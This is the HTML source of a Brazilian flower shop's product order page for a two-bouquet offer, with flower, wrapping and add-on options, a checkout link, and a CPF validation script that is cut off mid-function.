<!DOCTYPE html>
<html lang="pt-br" translate="no">
<head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" type="image/jpg" href="images/logo.webp">
    <title>Floricultura Nacional - Faça seu pedido!</title>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.4.1/purify.min.js"></script>
    <meta name="description" content="Faça seu pedido online na Floricultura Nacional. Acesse e peça agora pelo delivery Contatei!">
    <link type="text/css" href="css/delivry.css" rel="stylesheet">
    <style type="text/css">
        h1,
        h2 {
            color: #146914;
        }

        header#topo .cover {
            background-color: #146914;
        }

        header#topo .info h1 {
            color: #146914;
        }

        header#topo .info .icones a {
            color: #146914;
            border-color: #146914;
        }

        header#topo .cover .logo {
            background: #146914;
        }

        header#topo #menuCategorias {
            background: #146914;
        }

        header#topo .categorias a {
            border-top-color: #146914;
        }

        footer {
            background: #146914;
        }

        footer#carrinho .container .icone span {
            color: #146914;
        }

        .btn,
        a.voltar,
        .btnSair,
        .btnFidelidade,
        .btnGoogle,
        .btnEmail,
        .btnSemCadastro {
            background: #146914;
        }

        .qtdeProduto i:hover {
            color: #146914;
        }

        .lista .item .col .nomeProduto {
            color: #146914;
        }

        main#lista .produtos .item a:hover {
            border: 2px solid #146914;
        }

        #pedido .entrega .radio label input[type="radio"]:checked,
        #pedido .entrega .radio label:hover {
            background: #146914;
        }

        #pedido .pagamentos input[type="radio"]:checked+label::before,
        #detalhesProduto .info2 .opcoes input[type="checkbox"]:checked+label::before,
        #pedido .trocarPontos input[type="checkbox"]:checked+label::before {
            background-color: #146914;
            border: 2px solid #146914;
        }

        .selecionado {
            border: 2px solid #146914;
        }

        #meuCarrinho button.fechar,
        #rastreamento .registro span.passou {
            background: #146914;
        }

        span.estoque i {
            color: #146914;
        }
    </style>
    <meta name="theme-color" content="#5b0e5c">
    <meta name="apple-mobile-web-app-capacity" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar" content="#5b0e5c">
    <meta name="apple-mobile-web-app-status-bar-style" content="#5b0e5c">
    <meta name="apple-mobile-web-app-title" content="Floricultura Nacional">
    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="icon?family=Material+Icons">
    <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
	<!--
<script>
        window.pixelId = "67ac8ffc1039ad57af6258df";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script>
	-->
	<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
</head>
<body>
    <div id="opacidade" class="fechar"></div>
    <div>
        <div class="container containerFinalizar">
            <a class="voltar" href="index.html" title="Voltar"><i class="fa-solid fa-chevron-left"></i> VOLTAR</a>
            <div id="detalhesProduto">
                <div class="info1">
                    <div class="somarAoPreco" style="display:none">s</div>
                    <div class="fotoProduto">
                        <figure>
                            <img src="data:image/jpeg;base64,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Y6d/CFY3KF7TlQiq1rVAytfbUBf/AC2nn8b/AE+X1merdwnvcz5R2Rp9zi/qz+HxsQNSAVU3A8tD8OcyXnmnma47LiwUk5SbX22uPScr1VWjSN4tTJBsN/kDqflpJWnco1X7spWL4SiWNyAU9kcqPkonr8NbmxRLz80avKRVvEb+glWO0VyzWflH7pWjdImG2a1JAQEBAQEBAQEBAQEBAQEBAQEBAQOfCrlzD+K/xA/pMnDTFZtj8xK7LudW+DNwcwI1Gx8vMS20WjJFu8IxMckwqva5g1emGJsq3A5ZtSL/AN9J5ntG/wDU16Q9Dgq6x7+Kn9psGVrDE0Pt0vEQdL31Nr7mxPxlVPer3XTPLLr4Xj+/CBhkqMneZeTKSRdTyN9LenWciI2jaJ0216RvoT06j57Tqtduybj6qv8ACzg/7ifyInq8LaIw/LbDnifxPolk69dZZijpzT3nr9/kheeuo8dGctQICAgICAgICAgICAgICAgICAgICB4BORER1Ny9EkKX2kp5sQfIj/sE+e9oTvNaPl+z2OEj+lDkKgnKRvqPUfvKKTy9F143CMxWFs1KogytTYgm5tka5Itbre3QzRavSVVbdYdJIazDY+/5SMTuNoWjU6XHs3Q/ywB++WJ/3W/JRPW4fHFsHLPnbBltrJv0S1O9hfeaab5Y33U21voyknCAgICAgICAgICB4DOj2cCAgICAgICAgICdEBxfhFQu1SnZ81jkJym4AGhOh011tPM4ngbXvN6z38N2Di4pWK2hAYyo4ZAabIfvBhbbmOXMa6iebkpak6tGm+l4v1q567jff9xteSrbmr1V3rqW3A8NqVSe7pnxaltkvte/X5y+mC+Sd1j/AIpvkrWNSveCw4p00QfdAF+p5n43ns46clYr6PNtbmmZbpJwgICAgICAgICAgIHgE6PZwICAgICAgICAgICdGFakrizKGG9iAR85G1a2jVo27W01ncS504ZRBuKKX9AfhfaQrgxVncVj6JTlvPeZdctQJwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH/9k=" width="300px" height="300px" alt="2 Bouquets Pequenos">
                        </figure>
                    </div>
                    <div class="descricao">
                        <h3>2 Bouquets Médios</h3>
                        <span class="detalhe">Flor Customizável, Embrulho e Adicionais</span>
                        por
                        <span class="preco">
                            R$ 40,90<span style="display:none;">40.90</span>
                        </span>
                        <span></span>
                    </div>
                </div>
                <div class="info2">
                    <div id="flower-type" class="tipo" data-id="15314" data-calculo="n" data-minimo="1" data-maximo="2" data-opcional="n">
                        <div class="topo">
                            <div>
                                <h3>Escolha o Tipo de Flor:</h3>
                                <span class="detalhe">Escolha até 2 opções</span>
                            </div>
                            <div class="col2">
                                <span class="escolhidos"><span>0</span>/2</span>
                                <span class="obrigatorio">OBRIGATÓRIO</span>
                                <i class="fa-solid fa-circle-check" style=""></i>
                            </div>
                        </div>
                        <div class="opcoes" data-id="118901">
                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
                                <span class="nome" style="">
                                    <b>Rosas</b>
                                    <span class="detalheOpcao" style="padding-right:10px"></span>
                                    <span class="preco"><span style="display:none;">0.00</span></span>
                                </span>
                                <div class="qtdeProdutoOpcao">
                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
                                </div>
                            </div>
                        </div>
                        <div class="opcoes" data-id="118902">
                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
                                <span class="nome" style="">
                                    <b>Lírios</b>
                                    <span class="detalheOpcao" style="padding-right:10px"></span>
                                    <span class="preco"><span style="display:none;">0.00</span></span>
                                </span>
                                <div class="qtdeProdutoOpcao">
                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
                                </div>
                            </div>
                        </div>
                        <div class="opcoes" data-id="118903">
                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
                                <span class="nome" style="">
                                    <b>Tulipas</b>
                                    <span class="detalheOpcao" style="padding-right:10px"></span>
                                    <span class="preco"><span style="display:none;">0.00</span></span>
                                </span>
                                <div class="qtdeProdutoOpcao">
                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="wrapping-style" class="tipo" data-id="15315" data-calculo="n" data-minimo="1" data-maximo="1" data-opcional="n">
                        <div class="topo">
                            <div>
                                <h3>Estilo de Embrulho:</h3>
                                <span class="detalhe">Escolha 1 opção</span>
                            </div>
                            <div class="col2">
                                <span class="escolhidos"><span>0</span>/1</span>
                                <span class="obrigatorio">OBRIGATÓRIO</span>
                                <i class="fa-solid fa-circle-check" style=""></i>
                            </div>
                        </div>
                        <div class="opcoes" data-id="118904">
                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
                                <span class="nome" style="">
                                    <b>Papel Colorido</b>
                                    <span class="detalheOpcao" style="padding-right:10px"></span>
                                    <span class="preco"><span style="display:none;">0.00</span></span>
                                </span>
                                <div class="qtdeProdutoOpcao">
                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
                                </div>
                            </div>
                        </div>
                        <div class="opcoes" data-id="118905">
                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
                                <span class="nome" style="">
                                    <b>Tecido Elegante</b>
                                    <span class="detalheOpcao" style="padding-right:10px"></span>
                                    <span class="preco"><span style="display:none;">0.00</span></span>
                                </span>
                                <div class="qtdeProdutoOpcao">
                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="add-ons" class="tipo" data-id="15316" data-calculo="n" data-minimo="0" data-maximo="2" data-opcional="s">
    <div class="topo">
        <div>
            <h3>Adicionais:</h3>
            <span class="detalhe">Escolha até 2 opções</span>
        </div>
        <div class="col2">
            <span class="escolhidos"><span>0</span>/2</span>
            <i class="fa-solid fa-circle-check" style="display: inline"></i>
        </div>
    </div>
    <div class="opcoes" data-id="118912">
        <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
            <span class="nome" style="">
                <b>Ferrero Rocher</b>
                <span class="detalheOpcao" style="padding-right:10px"></span>
                <span class="preco"><span style="display:none;">3.00</span>+ R$ 3,00</span>
            </span>
            <div class="qtdeProdutoOpcao">
                <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
            </div>
        </div>
    </div>
    <div class="opcoes" data-id="118913">
        <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
            <span class="nome" style="">
                <b>KitKat</b>
                <span class="detalheOpcao" style="padding-right:10px"></span>
                <span class="preco"><span style="display:none;">3.00</span>+ R$ 3,00</span>
            </span>
            <div class="qtdeProdutoOpcao">
                <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
            </div>
        </div>
    </div>
    <div class="opcoes" data-id="118914">
        <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
            <span class="nome" style="">
                <b>Balão</b>
                <span class="detalheOpcao" style="padding-right:10px"></span>
                <span class="preco"><span style="display:none;">5.00</span>+ R$ 5,00</span>
            </span>
            <div class="qtdeProdutoOpcao">
                <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
            </div>
        </div>
    </div>
    <div class="opcoes" data-id="118915">
        <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
            <span class="nome" style="">
                <b>Cartão</b>
                <span class="detalheOpcao" style="padding-right:10px"></span>
                <span class="preco"><span style="display:none;">5.00</span>+ R$ 5,00</span>
            </span>
            <div class="qtdeProdutoOpcao">
                <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
            </div>
        </div>
    </div>
    <div class="opcoes" data-id="118916">
        <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
            <span class="nome" style="">
                <b>Ursinho de Pelúcia Azul</b>
                <span class="detalheOpcao" style="padding-right:10px"></span>
                <span class="preco"><span style="display:none;">8.00</span>+ R$ 8,00</span>
            </span>
            <div class="qtdeProdutoOpcao">
                <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
            </div>
        </div>
    </div>
    <div class="opcoes" data-id="118917">
        <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
            <span class="nome" style="">
                <b>Ursinho de Pelúcia Marrom</b>
                <span class="detalheOpcao" style="padding-right:10px"></span>
                <span class="preco"><span style="display:none;">8.00</span>+ R$ 8,00</span>
            </span>
            <div class="qtdeProdutoOpcao">
                <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
            </div>
        </div>
    </div>
    <div class="opcoes" data-id="118918">
        <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
            <span class="nome" style="">
                <b>Ursinho de Pelúcia Roxo</b>
                <span class="detalheOpcao" style="padding-right:10px"></span>
                <span class="preco"><span style="display:none;">8.00</span>+ R$ 8,00</span>
            </span>
            <div class="qtdeProdutoOpcao">
                <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
                <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
            </div>
        </div>
    </div>
</div>
                    <div class="overlay"></div>
                    <div class="imagem-ampliada">
                        <img src="#" alt="">
                        <button class="fechar"><i class="fa-solid fa-xmark"></i></button>
                    </div>
                    <label>Adicionar algum detalhe?</label>
                    <input class="observacao" type="text" name="observacao" placeholder="Escreva o detalhe aqui (ex. mensagem no cartão) ..." maxlength="140">
                    <em><span>0</span>/140</em>
                </div>
                <div class="info3">
                    <input id="idProduto" type="hidden" name="idProduto" value="12222">
					<!-- Inside <div class="info3"> -->
<input type="hidden" id="productPrice" value="40.90">
                    <div class="qtdeProduto" style="display: none;">
                        <button class="removerQtde" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
                        <input class="qtde" type="text" value="2" min="1" max="86" size="3" disabled="">
                        <button class="adicionarQtde" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
                    </div>
                    <div id="precoProduto">R$ 40,90</div>
                    <span class="precoProduto" style="display:none">40.90</span>
                    <button class="btn adicionarProduto" onclick="finalizar()">FINALIZAR PEDIDO</button>
                    <a href="https://checkout.resgatedex.shop/BOUQUET123" id="finalizarPedido" style="display: none;"></a>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript" src="js/jquery.js"></script>
    <script type="text/javascript" src="js/deliveryProduto.js"></script>
    <script src="js/all.js" data-auto-replace-svg="nest" defer type="text/javascript"></script>
    <script type="text/javascript" src="js/jquery-mask.js" defer></script>

    <script>
        $(document).ready(function() {
    if ($.fn.mask) {
        console.log('jQuery mask loaded');
    }
});

function isValidCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let sum = 0, remainder;
    for (let i = 1; i <= 9; i++) sum += parseInt(cpf[i-1]) * (11 - i);
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf[9])) return false;
    sum = 0;
    for (let i = 1; i <= 10; i++) sum += parseInt(cpf[i-1]) * (12 - i);
